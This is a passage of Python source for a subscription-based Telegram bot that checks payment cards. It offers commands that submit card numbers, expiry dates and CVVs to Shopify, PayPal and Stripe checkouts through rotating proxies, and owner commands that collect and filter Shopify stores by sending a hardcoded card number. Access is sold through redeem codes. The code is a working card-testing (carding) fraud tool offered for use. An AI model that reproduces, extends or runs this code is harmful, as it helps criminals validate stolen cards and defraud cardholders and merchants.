@bot.message_handler(commands=list(ONYX_GATES.keys()))
@flood_control
@check_access
def handle_onyx_single_check(message):
    """Dispatch to the correct Onyx gate based on command."""
    cmd = message.text.split()[0].lstrip('/').lower()
    gate_info = ONYX_GATES.get(cmd)
    if not gate_info:
        return
    gate_func, gate_name = gate_info
    handle_onyx_gate(message, gate_func, gate_name)


@bot.message_handler(commands=['addsingleurls'])
def handle_add_single_urls(message):
    if not is_owner(message.from_user.id):
        return
    bot.reply_to(message, "📋 Send a .txt file with sites (one per line) to add to the single‑check list.")
    bot.register_next_step_handler(message, process_add_single_urls_file)

def process_add_single_urls_file(message):
    """Process uploaded sites file in a background thread to avoid blocking."""
    # Immediately acknowledge receipt to avoid timeout
    bot.reply_to(message, "📥 File received. Processing in background...")
    # Start processing in a thread
    threading.Thread(target=_process_add_single_urls_file_thread, args=(message,)).start()

def _process_add_single_urls_file_thread(message):
    try:
        if not message.document or not message.document.file_name.endswith('.txt'):
            bot.send_message(message.chat.id, "❌ Please send a .txt file.")
            return

        status_msg = bot.send_message(message.chat.id, "⏳ Downloading and validating sites...")

        file_info = bot.get_file(message.document.file_id)
        file_data = bot.download_file(file_info.file_path)
        content = file_data.decode('utf-8', errors='ignore')

        urls = [line.strip() for line in content.split('\n') if line.strip()]
        urls = list(set(urls))
        total = len(urls)

        if total == 0:
            bot.edit_message_text("❌ No URLs found.", message.chat.id, status_msg.message_id)
            return

        added = 0
        skipped = 0
        test_cc = "5242430428405662|03|28|323"
        proxy = random.choice(proxies_data['proxies']) if proxies_data['proxies'] else None

        for idx, url in enumerate(urls, 1):
            # Clean URL
            if not url.startswith(('http://', 'https://')):
                url = f"https://{url}"
            url = url.rstrip('/')

            # Quick validation (check if site returns a product)
            try:
                r = requests.get(f"{url}/products.json?limit=1", timeout=10, verify=False)
                if r.status_code != 200:
                    skipped += 1
                    continue
                data = r.json()
                products = data.get('products', [])
                if not products:
                    skipped += 1
                    continue
            except:
                skipped += 1
                continue

            # Deeper check with test card
            response = check_shopify_api(url, test_cc, proxy)
            if response.get('status') == 'ERROR' or 'CAPTCHA' in response.get('Response', '').upper():
                skipped += 1
                continue

            # Check duplicate
            if not any(s['url'] == url for s in single_sites_data['sites']):
                price = get_site_price(url, timeout=10) or '0.00'
                single_sites_data['sites'].append({
                    'url': url,
                    'name': url.replace('https://', '').replace('http://', ''),
                    'price': f"{price:.2f}",
                    'gateway': 'Shopify Payments'
                })
                added += 1
            else:
                skipped += 1

            # Update progress every 5 sites or at the end
            if idx % 5 == 0 or idx == total:
                try:
                    bot.edit_message_text(
                        f"⏳ Progress: {idx}/{total}\n✅ Added: {added}\n⛔ Skipped: {skipped}",
                        message.chat.id, status_msg.message_id
                    )
                except:
                    pass

        # Save once at the end
        save_json(SINGLE_SITES_FILE, single_sites_data)

        bot.edit_message_text(
            f"✅ Done!\nAdded: {added}\nSkipped: {skipped}\nTotal single sites: {len(single_sites_data['sites'])}",
            message.chat.id, status_msg.message_id
        )
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
@bot.message_handler(commands=['viewsinglesites'])
def handle_view_single_sites(message):
    if not is_owner(message.from_user.id):
        return

    sites = single_sites_data.get('sites', [])
    if not sites:
        bot.reply_to(message, "No sites in single‑check list.")
        return

    text = "📋 **Single‑Check Sites:**\n\n"
    for i, site in enumerate(sites, 1):
        text += f"{i}. {site['url']} (${site.get('price', '0.00')})\n"

    if len(text) > 4000:
        with open("singlesites.txt", "w") as f:
            for site in sites:
                f.write(f"{site['url']} | {site.get('price', '0.00')}\n")
        with open("singlesites.txt", "rb") as f:
            bot.send_document(message.chat.id, f, caption="Single‑check sites")
        os.remove("singlesites.txt")
    else:
        bot.reply_to(message, text, parse_mode="Markdown")


@bot.message_handler(commands=['rmsinglesite'])
def handle_remove_single_site(message):
    if not is_owner(message.from_user.id):
        return

    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /rmsinglesite <url or part of url>")
        return

    target = parts[1].strip().lower()
    original_count = len(single_sites_data['sites'])
    new_sites = []
    removed = 0

    for site in single_sites_data['sites']:
        if target in site['url'].lower():
            removed += 1
        else:
            new_sites.append(site)

    if removed:
        single_sites_data['sites'] = new_sites
        save_json(SINGLE_SITES_FILE, single_sites_data)
        bot.reply_to(message, f"✅ Removed {removed} site(s) matching '{target}'.")
    else:
        bot.reply_to(message, f"❌ No site found matching '{target}'.")

@bot.message_handler(commands=['clearsinglesites'])
def handle_clear_single_sites(message):
    if not is_owner(message.from_user.id):
        return

    count = len(single_sites_data['sites'])
    single_sites_data['sites'] = []
    save_json(SINGLE_SITES_FILE, single_sites_data)
    bot.reply_to(message, f"✅ Removed all {count} single‑check sites.")

@bot.message_handler(commands=['cleansinglesites'])
def handle_clean_single_sites(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "🚫 Owner only command.")
        return

    # Run in a separate thread to avoid blocking
    thread = threading.Thread(target=process_clean_single_sites, args=(message,))
    thread.start()


def process_clean_single_sites(message):
    try:
        # Load current single sites
        if not single_sites_data['sites']:
            bot.reply_to(message, "❌ No single‑check sites to clean.")
            return

        total_sites = len(single_sites_data['sites'])
        status_msg = bot.reply_to(message, f"🧹 **Cleaning {total_sites} single‑check sites...**", parse_mode='Markdown')

        valid_sites = []
        test_cc = "5242430428405662|03|28|323"  # dummy test card

        for i, site_obj in enumerate(single_sites_data['sites']):
            # Update status every 10 sites
            if i % 10 == 0:
                try:
                    bot.edit_message_text(
                        f"🧹 **Cleaning Single Sites...**\n\n"
                        f"Checking: {site_obj['url']}\n"
                        f"Progress: {i}/{total_sites}\n"
                        f"✅ Valid: {len(valid_sites)}\n"
                        f"❌ Removed: {i - len(valid_sites)}",
                        chat_id=message.chat.id,
                        message_id=status_msg.message_id,
                        parse_mode='Markdown'
                    )
                except:
                    pass

            try:
                # Use a random proxy if available
                proxy = random.choice(proxies_data['proxies']) if proxies_data['proxies'] else None
                response = check_shopify_api(site_obj['url'], test_cc, proxy)

                # Safely extract response string
                response_str = ""
                if isinstance(response, dict):
                    response_str = (response.get('Response', '') + " " + response.get('message', '')).upper()
                elif isinstance(response, tuple):
                    response_str = " ".join(str(x) for x in response).upper()
                elif isinstance(response, str):
                    response_str = response.upper()
                elif response is None:
                    response_str = "CONNECTION_ERROR"

                # Keep site if it returns a gateway response (including DECLINED)
                # Adjust keywords as needed – you may want to keep sites that give any valid response
                valid_keywords = [
                    'CARD_DECLINED', '3D', 'THANK YOU', 'EXPIRED_CARD', 
                    'EXPIRE_CARD', 'EXPIRED', 'INSUFFICIENT_FUNDS', 
                    'INCORRECT_CVC', 'INCORRECT_ZIP', 'FRAUD_SUSPECTED', 
                    'INCORRECT_NUMBER', 'INVALID_TOKEN', 'AUTHENTICATION_ERROR',
                    'DECLINED', 'APPROVED'
                ]

                if any(keyword in response_str for keyword in valid_keywords):
                    # Update last response for info (optional)
                    site_obj['last_response'] = response_str[:30]
                    valid_sites.append(site_obj)
                # else: site is removed (not added to valid_sites)

            except Exception as e:
                print(f"⚠️ Error checking site {site_obj.get('url')}: {e}")
                continue  # site not added (effectively removed)

            time.sleep(0.5)  # small delay to avoid flooding

        # Save cleaned list
        single_sites_data['sites'] = valid_sites
        save_json(SINGLE_SITES_FILE, single_sites_data)

        removed = total_sites - len(valid_sites)
        bot.edit_message_text(
            f"✅ **Single‑check Site Cleaning Finished!**\n\n"
            f"🗑 Removed: {removed}\n"
            f"💎 Active Sites (returning valid responses): {len(valid_sites)}",
            chat_id=message.chat.id,
            message_id=status_msg.message_id,
            parse_mode='Markdown'
        )

    except Exception as e:
        bot.reply_to(message, f"❌ Critical Error: {e}")
        traceback.print_exc()



@bot.message_handler(commands=['splitfile'])
def handle_split_file(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "🚫 Owner only command.")
        return

    try:
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(message, "Usage: /splitfile <number_of_parts>\nThen upload the .txt file you want to split.")
            return

        n = int(parts[1])
        if n <= 0:
            bot.reply_to(message, "Number of parts must be positive.")
            return

        # Ask for the file
        bot.reply_to(message, f"📂 Now send me the .txt file to split into {n} parts.")
        bot.register_next_step_handler(message, process_split_file, n)

    except ValueError:
        bot.reply_to(message, "Invalid number format.")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

def process_split_file(message, n):
    try:
        if not message.document or not message.document.file_name.endswith('.txt'):
            bot.reply_to(message, "❌ Please send a .txt file.")
            return

        status_msg = bot.reply_to(message, "⏳ Downloading and splitting file...")
        file_info = bot.get_file(message.document.file_id)
        file_data = bot.download_file(file_info.file_path)
        content = file_data.decode('utf-8', errors='ignore')

        lines = [line.strip() for line in content.split('\n') if line.strip()]
        total = len(lines)

        if total == 0:
            bot.edit_message_text("❌ File is empty.", message.chat.id, status_msg.message_id)
            return

        part_size = total // n
        remainder = total % n

        start = 0
        for i in range(n):
            end = start + part_size + (1 if i < remainder else 0)
            part_lines = lines[start:end]
            filename = f"split_part_{i+1}.txt"
            with open(filename, 'w', encoding='utf-8') as f:
                f.write('\n'.join(part_lines))
            with open(filename, 'rb') as f:
                bot.send_document(message.chat.id, f, caption=f"Part {i+1}/{n} – {len(part_lines)} lines")
            os.remove(filename)
            start = end

        bot.edit_message_text(f"✅ Split {total} lines into {n} parts.", message.chat.id, status_msg.message_id)

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")


@bot.message_handler(commands=['addmysite'])
def handle_add_my_site(message):
    user_id = message.from_user.id
    if not is_user_allowed(user_id) and user_id not in OWNER_ID:
        bot.reply_to(message, "🚫 Access Denied")
        return

    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /addmysite <url1> <url2> ...\nOr send multiple lines.")
        return

    raw_urls = parts[1].strip()
    # Split by whitespace or newlines
    urls = re.split(r'[\s\n]+', raw_urls)
    urls = [u.strip() for u in urls if u.strip()]

    if not urls:
        bot.reply_to(message, "No URLs provided.")
        return

    status_msg = bot.reply_to(message, f"⏳ Validating {len(urls)} site(s)...")
    proxy = random.choice(proxies_data['proxies']) if proxies_data.get('proxies') else None

    added = []
    skipped_duplicate = []
    failed = []

    user_sites = get_user_sites(user_id)

    for url in urls:
        # Clean URL
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        url = url.rstrip('/')

        # Check duplicate in user's list
        if any(s['url'] == url for s in user_sites):
            skipped_duplicate.append(url)
            continue

        # Validate and get price
        try:
            price = get_site_price(url, timeout=10)
            if price <= 0:
                failed.append((url, "No products found"))
                continue

            new_id = get_next_user_site_id(user_id)
            site_entry = {
                'id': new_id,
                'url': url,
                'name': url.replace('https://', '').replace('http://', ''),
                'price': f"{price:.2f}",
                'gateway': 'Shopify Payments'
            }
            user_sites.append(site_entry)
            added.append((url, new_id, price))
            # Update user_sites for next iteration's duplicate check
            # (we'll save at the end)

        except Exception as e:
            failed.append((url, str(e)[:50]))

    # Save updated list
    if added:
        save_user_sites_list(user_id, user_sites)

    # Build response
    response_text = f"<b>📥 Site Import Result</b>\n\n"
    if added:
        response_text += f"✅ <b>Added:</b> {len(added)}\n"
        for url, sid, price in added[:5]:
            response_text += f"  • ID {sid}: ${price:.2f}\n"
        if len(added) > 5:
            response_text += f"  ... and {len(added)-5} more\n"
    if skipped_duplicate:
        response_text += f"\n⚠️ <b>Skipped (duplicate):</b> {len(skipped_duplicate)}\n"
    if failed:
        response_text += f"\n❌ <b>Failed:</b> {len(failed)}\n"
        for url, reason in failed[:3]:
            response_text += f"  • {url}: {reason}\n"

    response_text += f"\n📦 <b>Total in your list:</b> {len(user_sites)}"

    bot.edit_message_text(response_text, message.chat.id, status_msg.message_id, parse_mode='HTML')


@bot.message_handler(commands=['showmyid'])
def handle_show_my_site(message):
    user_id = message.from_user.id
    try:
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(message, "Usage: /showmyid <id>")
            return
        site_id = int(parts[1])
        
        user_sites = get_user_sites(user_id)
        site = next((s for s in user_sites if s.get('id') == site_id), None)
        if not site:
            bot.reply_to(message, f"❌ Site ID {site_id} not found in your list.")
            return
        
        text = f"""
<b>🆔 Your Site ID:</b> <code>{site_id}</code>
<b>🌐 URL:</b> {site['url']}
<b>💰 Price:</b> ${site.get('price', '0.00')}
<b>🛡️ Gateway:</b> {site.get('gateway', 'Unknown')}
"""
        bot.reply_to(message, text, parse_mode='HTML')
    except:
        bot.reply_to(message, "Invalid ID format.")

@bot.message_handler(commands=['rmmyid'])
def handle_remove_my_site(message):
    user_id = message.from_user.id
    try:
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(message, "Usage: /rmmyid <id>")
            return
        site_id = int(parts[1])
        
        user_sites = get_user_sites(user_id)
        new_sites = [s for s in user_sites if s.get('id') != site_id]
        
        if len(new_sites) == len(user_sites):
            bot.reply_to(message, f"❌ Site ID {site_id} not found.")
            return
        
        save_user_sites_list(user_id, new_sites)
        bot.reply_to(message, f"✅ Site ID {site_id} removed from your list.")
    except:
        bot.reply_to(message, "Invalid ID format.")

@bot.message_handler(commands=['clearmysites'])
def handle_clear_my_sites(message):
    user_id = message.from_user.id
    save_user_sites_list(user_id, [])
    bot.reply_to(message, "✅ All your sites cleared.")


@bot.message_handler(commands=['info'])
def handle_info(message):
    user_id = message.from_user.id
    target_user_id = user_id
    target_user = message.from_user

    # If owner and a mention/ID is provided, check that user instead
    if is_owner(user_id):
        parts = message.text.split()
        if len(parts) >= 2:
            target = parts[1]
            # Remove @ if present
            if target.startswith('@'):
                target = target[1:]
            # Try to get user info (if it's a numeric ID, use it directly)
            try:
                if target.isdigit():
                    target_user_id = int(target)
                else:
                    # Not numeric – we can't reliably get user ID from username without API,
                    # but we can try to find in our database by username? We'll just use the string as ID.
                    # For simplicity, assume numeric ID is passed.
                    bot.reply_to(message, "Please provide a numeric user ID.")
                    return
            except:
                bot.reply_to(message, "Invalid user ID format.")
                return

    user_str = str(target_user_id)

    # Owner viewing own info? Show god mode
    if is_owner(target_user_id) and target_user_id == user_id:
        info = f"""
┏━━━━━━━⍟
┃ 👑 <b>GOD MODE ENGAGED</b>
┗━━━━━━━━━━━⊛

🆔 <b>User ID:</b> <code>{html.escape(user_str)}</code>
💠 <b>Status:</b> 🌌 Supreme Overlord
♾️ <b>Access:</b> Infinite limits. No restrictions.
"""
    elif user_str in users_data:
        data = users_data[user_str]
        try:
            expiry = datetime.fromisoformat(data['expiry'])
        except:
            expiry = datetime.now() - timedelta(days=1)
        now = datetime.now()
        days_left = (expiry - now).days
        is_active = expiry > now

        limit = data.get('limit', 1000)
        daily_used = data.get('usage_today', 0)
        daily_limit = data.get('daily_limit', 10000)

        if is_active:
            role_badge = "✅ Active Premium"
            days_display = f"{days_left} days left"
        else:
            role_badge = "⏳ Expired Premium"
            days_display = f"Expired {abs(days_left)} days ago"

        info = f"""
┏━━━━━━━⍟
┃ <b>👤 USER INFO</b>
┗━━━━━━━━━━━⊛

🆔 <b>User ID:</b> <code>{html.escape(user_str)}</code>
⏳ <b>Expires:</b> {expiry.strftime('%Y-%m-%d %H:%M:%S')} ({days_display})
📊 <b>Per‑upload limit:</b> {limit}
📈 <b>Daily usage:</b> {daily_used}/{daily_limit}
🔰 <b>Role:</b> {role_badge}
"""
        if not is_active:
            info += "\n⚠️ <i>Subscription expired. Renew to regain access.</i>"
    else:
        info = f"""
┏━━━━━━━⍟
┃ 🪫 <b>BASIC ACCOUNT INFO</b>
┗━━━━━━━━━━━⊛

🆔 <b>User ID:</b> <code>{html.escape(user_str)}</code>
🧱 <b>Status:</b> ❌ Unregistered / Free User
🔒 <b>Access:</b> Denied. You need a subscription to run checks.

<i>Hit the "Access Plans" button to upgrade your account!</i>
"""

    bot.reply_to(message, info, parse_mode='HTML')

@bot.message_handler(commands=['listsite'])
def handle_list_site(message):
    if not is_owner(message.from_user.id):
        safe_send(bot.reply_to, message, "🚫 Owner only command.")
        return

    try:
        args = message.text.split()[1:]  # everything after /listsite
        sites = sites_data.get('sites', [])
        if not sites:
            safe_send(bot.reply_to, message, "No sites in database.")
            return

        # Default: no filter
        filter_type = None
        filter_value = None
        filter_by_price = False

        if args:
            if args[0].lower() == 'cat' and len(args) >= 2:
                try:
                    filter_type = int(args[1])
                    filter_by_price = False
                except ValueError:
                    safe_send(bot.reply_to, message, "Category must be a number. Use /listsite cat <id>")
                    return
            elif args[0].lower() == 'price' and len(args) >= 2:
                try:
                    filter_value = float(args[1])
                    filter_by_price = True
                except ValueError:
                    safe_send(bot.reply_to, message, "Price must be a number. Use /listsite price <max>")
                    return
            elif args[0].lower() == 'all':
                pass  # no filter
            else:
                safe_send(bot.reply_to, message, "Usage:\n/listsite\n/listsite all\n/listsite cat <id>\n/listsite price <max>")
                return

        # Prepare summary counts by response type
        response_counts = {}
        for site in sites:
            resp = site.get('last_response', 'Unknown').upper()
            response_counts[resp] = response_counts.get(resp, 0) + 1

        # Build summary string
        summary_lines = ["📊 <b>Site Summary</b>\n"]
        for resp, count in sorted(response_counts.items(), key=lambda x: x[1], reverse=True):
            summary_lines.append(f"• {resp}: {count} sites")
        summary = "\n".join(summary_lines)

        # Apply filter
        filtered_sites = []
        filter_desc = "all sites"
        if filter_by_price:
            filtered_sites = [s for s in sites if float(s.get('price', 999)) <= filter_value]
            filter_desc = f"price ≤ ${filter_value}"
        elif filter_type is not None:
            # Category mapping (extend as needed)
            category_map = {
                1: ['ERROR'],
                2: ['DECLINED'],
                3: ['CAPTCHA'],
                4: ['FRAUD'],
                5: ['INCORRECT CVC', 'CVC'],
                6: ['INCORRECT ZIP', 'ZIP'],
                7: ['INSUFFICIENT FUNDS', 'FUNDS'],
            }
            keywords = category_map.get(filter_type, [])
            if not keywords:
                safe_send(bot.reply_to, message, f"Invalid category ID. Available IDs: {list(category_map.keys())}")
                return
            filtered_sites = []
            for s in sites:
                resp = s.get('last_response', '').upper()
                if any(k in resp for k in keywords):
                    filtered_sites.append(s)
            filter_desc = f"category {filter_type}"
        else:
            filtered_sites = sites  # all sites

        # Send summary (unfiltered)
        safe_send(bot.send_message, message.chat.id, summary, parse_mode='HTML')

        # Send filtered sites as a text file
        if filtered_sites:
            safe_desc = filter_desc.replace(' ', '_').replace('$', '').replace('.', '_')
            filename = f"filtered_sites_{safe_desc}.txt"
            with open(filename, 'w', encoding='utf-8') as f:
                for site in filtered_sites:
                    f.write(f"{site['url']} | {site.get('price', 'N/A')} | {site.get('last_response', 'Unknown')}\n")
            with open(filename, 'rb') as f:
                safe_send(bot.send_document, message.chat.id, f, caption=f"Filtered: {filter_desc} – {len(filtered_sites)} sites")
            os.remove(filename)
        else:
            safe_send(bot.send_message, message.chat.id, f"No sites match {filter_desc}.")

    except Exception as e:
        logger.error(f"Error in /listsite: {traceback.format_exc()}")
        safe_send(bot.reply_to, message, f"❌ Error: {e}")
# @bot.callback_query_handler(func=lambda call: call.data == "file_type_proxy")
# def test_proxy_callback(call):
#     """When user clicks PROXY button"""
#     try:
#         bot.answer_callback_query(call.id, "✅ PROXY MODE SELECTED!", show_alert=True)
#         bot.edit_message_text(
#             "✅ <b>PROXY MODE ACTIVATED</b>\n\n"
#             "You can now upload proxy files\n"
#             "Format: host:port:username:password",
#             chat_id=call.message.chat.id,
#             message_id=call.message.message_id,
#             parse_mode='HTML'
#         )
#     except Exception as e:
#         logger.error(f"Proxy callback error: {e}")
#         bot.answer_callback_query(call.id, f"❌ Error: {str(e)}", show_alert=True)

# @bot.callback_query_handler(func=lambda call: call.data == "file_type_cc")
# def test_cc_callback(call):
#     """When user clicks CC button"""
#     try:
#         bot.answer_callback_query(call.id, "✅ CC MODE SELECTED!", show_alert=True)
#         bot.edit_message_text(
#             "✅ <b>CC MODE ACTIVATED</b>\n\n"
#             "You can now upload CC files\n"
#             "Format: CC|MM|YYYY|CVV",
#             chat_id=call.message.chat.id,
#             message_id=call.message.message_id,
#             parse_mode='HTML'
#         )
#     except Exception as e:
#         logger.error(f"CC callback error: {e}")
#         bot.answer_callback_query(call.id, f"❌ Error: {str(e)}", show_alert=True)
def validate_single_site(site_url, proxy=None):
    """
    Quick validation - just check if site is reachable
    Returns: (site_url, price, gateway, is_valid)
    """
    try:
        # Clean URL
        site_url = site_url.strip()
        if not site_url.startswith(('http://', 'https://')):
            site_url = f"https://{site_url}"
        site_url = site_url.rstrip('/')
        
        # Create session
        session = requests.Session()
        session.verify = False
        
        if proxy:
            proxy_url = f"http://{proxy}"
            session.proxies = {'http': proxy_url, 'https': proxy_url}
        
        # Try to get products (quick check)
        products_url = f"{site_url}/products.json?limit=10"
        r = session.get(products_url, timeout=10, verify=False)
        
        if r.status_code != 200:
            return (site_url, None, None, False)
        
        # Parse products
        data = r.json()
        products = data.get('products', [])
        
        if not products:
            return (site_url, None, None, False)
        
        # Find cheapest product
        min_price = float('inf')
        for p in products:
            for v in p.get('variants', []):
                if v.get('available'):
                    try:
                        price = float(v.get('price', 0))
                        if 0 < price < min_price:
                            min_price = price
                    except:
                        pass
        
        if min_price == float('inf'):
            return (site_url, None, None, False)
        
        # ✅ VALID SITE
        return (site_url, f"{min_price:.2f}", "Shopify Payments", True)
        
    except requests.Timeout:
        return (site_url, None, None, False)
    except Exception as e:
        return (site_url, None, None, False)


@bot.callback_query_handler(func=lambda call: call.data.startswith('set_price_'))
def handle_price_callback(call):
    """Handle price filter buttons: set_price_5, set_price_10, etc."""
    global price_filter
    
    try:
        if call.data == "set_price_cancel":
            bot.answer_callback_query(call.id, "Cancelled", show_alert=False)
            bot.edit_message_text(
                "Price filter setting cancelled.",
                chat_id=call.message.chat.id,
                message_id=call.message.message_id
            )
            return
        
        if call.data == "set_price_none":
            price_filter = None
            settings_data['price_filter'] = None
            save_json(SETTINGS_FILE, settings_data)
            
            bot.answer_callback_query(call.id, "✅ Filter removed", show_alert=False)
            bot.edit_message_text(
                f"✅ Price filter removed!\n\n"
                f"All {len(sites_data['sites'])} sites will be used.",
                chat_id=call.message.chat.id,
                message_id=call.message.message_id
            )
            return
        
        # Extract price: set_price_5 → 5
        price_value = call.data.replace('set_price_', '')
        
        try:
            price_filter = float(price_value)
            settings_data['price_filter'] = price_filter
            save_json(SETTINGS_FILE, settings_data)
            
            # Count filtered sites
            filtered_sites = [s for s in sites_data['sites'] 
                            if float(s.get('price', 0)) <= price_filter]
            
            bot.answer_callback_query(call.id, f"✅ Filter set to ${price_filter}", show_alert=False)
            bot.edit_message_text(
                f"✅ Price filter set to <b>BELOW {price_filter}$</b>\n\n"
                f"Available sites: {len(filtered_sites)}/{len(sites_data['sites'])}\n\n"
                f"Only sites with price ≤ {price_filter}$ will be used.",
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                parse_mode='HTML'
            )
        except ValueError:
            bot.answer_callback_query(call.id, "❌ Invalid price!", show_alert=True)
    
    except Exception as e:
        logger.error(f"Price callback error: {e}")
        bot.answer_callback_query(call.id, f"❌ Error: {str(e)}", show_alert=True)


@bot.callback_query_handler(func=lambda call: call.data == "check_subscription")
def check_subscription_callback(call):
    user_id = call.from_user.id
    if is_subscribed(user_id):
        bot.answer_callback_query(call.id, "✅ Verified! You can now use the bot.", show_alert=False)
        bot.edit_message_text(
            "✅ <b>Verification successful!</b>\n\nYou can now use the bot normally.",
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            parse_mode='HTML'
        )
    else:
        bot.answer_callback_query(call.id, "❌ You still haven't joined the channel.", show_alert=True)
# OWNER COMMANDS
@bot.message_handler(commands=['pro'])
def handle_approve_user(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "🚫 Owner only command.")
        return
    try:
        parts = message.text.split()
        if len(parts) != 3:
            bot.reply_to(message, "Usage: /pro <user_id> <days>")
            return
        user_id = parts[1]
        days = int(parts[2])
        expiry_date = datetime.now() + timedelta(days=days)

        # Add user with default limit = 1000
        users_data[user_id] = {
            'approved_by': message.from_user.id,
            'approved_date': datetime.now().isoformat(),
            'expiry': expiry_date.isoformat(),
            'days': days,
            'limit': 1000   # default limit
        }
        save_json(USERS_FILE, users_data)
        try:
            bot.send_message(
                user_id,
                f"🎉 <b>Access Granted!</b>\n\n"
                f"You have been approved to use this bot for {days} days.\n"
                f"Your card limit per mass check: 1000.\n"
                f"Your access will expire on: {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                f"Enjoy cooking! 🔥",
                parse_mode='HTML'
            )
        except:
            pass
        bot.reply_to(message, f"✅ User {user_id} approved for {days} days. Limit: 1000. Expiry: {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")
@bot.message_handler(commands=['redeem'])
def handle_redeem(message):
    if not is_owner(message.from_user.id):
        return
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "Usage: /redeem <days> [number_of_codes]")
            return
        days = int(parts[1])
        num_codes = int(parts[2]) if len(parts) > 2 else 1

        codes_data = load_json(CODES_FILE, {"codes": {}})
        import secrets
        new_codes = []
        for _ in range(num_codes):
            code = secrets.token_urlsafe(8).upper()
            codes_data["codes"][code] = {
                "days": days,
                "used_by": None,
                "created": datetime.now().isoformat()
            }
            new_codes.append(code)
        save_json(CODES_FILE, codes_data)

        bot.reply_to(message, f"✅ Generated {num_codes} code(s) for {days} days:\n" + "\n".join(new_codes))
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

@bot.message_handler(commands=['use'])
def handle_use_code(message):
    user_id = message.from_user.id
    user_str = str(user_id)

    # Check if user already has an active subscription
    if user_str in users_data:
        expiry_str = users_data[user_str].get('expiry')
        if expiry_str:
            try:
                expiry = datetime.fromisoformat(expiry_str)
                if expiry > datetime.now():
                    bot.reply_to(message, "❌ You already have an active subscription. Codes cannot be used by premium users.")
                    return
            except:
                pass

    try:
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(message, "Usage: /use <code>")
            return
        code = parts[1].strip().upper()

        codes_data = load_json(CODES_FILE, {"codes": {}})
        if code not in codes_data["codes"]:
            bot.reply_to(message, "❌ Invalid code.")
            return

        code_info = codes_data["codes"][code]
        if code_info["used_by"] is not None:
            bot.reply_to(message, "❌ Code already used.")
            return

        days = code_info["days"]
        expiry_date = datetime.now() + timedelta(days=days)

        users_data[user_str] = {
            'approved_by': "redeem",
            'approved_date': datetime.now().isoformat(),
            'expiry': expiry_date.isoformat(),
            'days': days,
            'limit': 1000  # default limit
        }
        save_json(USERS_FILE, users_data)

        code_info["used_by"] = user_id
        save_json(CODES_FILE, codes_data)

        bot.reply_to(message, f"✅ Access granted for {days} days! Expires: {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

@bot.message_handler(commands=['pp', 'pp2'])
@flood_control
@check_access
def handle_paypal_single(message):
    user_id = message.from_user.id
    cmd = message.text.split()[0].lower()
    gate_func = check_paypal_fixed if cmd == '/pp' else check_paypal_general
    gate_name = "PayPal Fixed" if cmd == '/pp' else "PayPal General"
    price = "1.00" if cmd == '/pp' else f"{PAYPAL_AMOUNT:.2f}"

    # Extract CC
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, f"Usage: {cmd} CC|MM|YYYY|CVV")
        return

    cc_text = parts[1]
    cc = extract_cc(cc_text)
    if not cc:
        bot.reply_to(message, "Invalid CC format. Use CC|MM|YYYY|CVV.")
        return

    # Select proxy: use user's personal first, else global
    user_proxies = get_user_proxies(user_id)
    if user_proxies:
        proxy = random.choice(user_proxies)
    else:
        proxy = random.choice(proxies_data['proxies']) if proxies_data['proxies'] else None

    processing_msg = bot.send_message(message.chat.id, f"⏳ Checking with {gate_name}...")

    start_time = time.time()
    try:
        msg, status = gate_func(cc, proxy=proxy)
    except Exception as e:
        msg, status = str(e), "ERROR"
    time_taken = round(time.time() - start_time, 2)

    # Get bin info
    bin_info = get_bin_info(cc.split('|')[0])

    # Get user name
    first = message.from_user.first_name or ""
    last = message.from_user.last_name or ""
    full_name = f"{first} {last}".strip()

    # Build rich message
    final_message = format_message(
        cc=cc,
        response=msg,
        status=status,
        gateway=gate_name,
        price=price,
        bin_info=bin_info,
        user_id=user_id,
        full_name=full_name,
        time_taken=time_taken,
        proxy_used=proxy
    )

    bot.edit_message_text(
        final_message,
        chat_id=message.chat.id,
        message_id=processing_msg.message_id,
        parse_mode='HTML'
    )

@bot.message_handler(commands=['stripe'])
@flood_control
@check_access
def handle_stripe_single(message):
    user_id = message.from_user.id
    # Extract CC
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /stripe CC|MM|YYYY|CVV")
        return

    cc_text = parts[1]
    cc = extract_cc(cc_text)
    if not cc:
        bot.reply_to(message, "Invalid CC format. Use CC|MM|YYYY|CVV.")
        return

    # Select proxy (user's personal first)
    user_proxies = get_user_proxies(user_id)
    if user_proxies:
        proxy = random.choice(user_proxies)
    else:
        proxy = random.choice(proxies_data['proxies']) if proxies_data['proxies'] else None

    processing_msg = bot.send_message(message.chat.id, "⏳ Checking with Stripe API...")

    start_time = time.time()
    try:
        msg, status = check_stripe_api(cc, proxy=proxy)
    except Exception as e:
        msg, status = str(e), "ERROR"
    time_taken = round(time.time() - start_time, 2)

    # Get bin info
    bin_info = get_bin_info(cc.split('|')[0])

    # Get user name
    first = message.from_user.first_name or ""
    last = message.from_user.last_name or ""
    full_name = f"{first} {last}".strip()

    # Build rich message (reuse format_message)
    final_message = format_message(
        cc=cc,
        response=msg,
        status=status,
        gateway="Stripe API",
        price="0.10$",   # or whatever amount the API charges
        bin_info=bin_info,
        user_id=user_id,
        full_name=full_name,
        time_taken=time_taken,
        proxy_used=proxy
    )

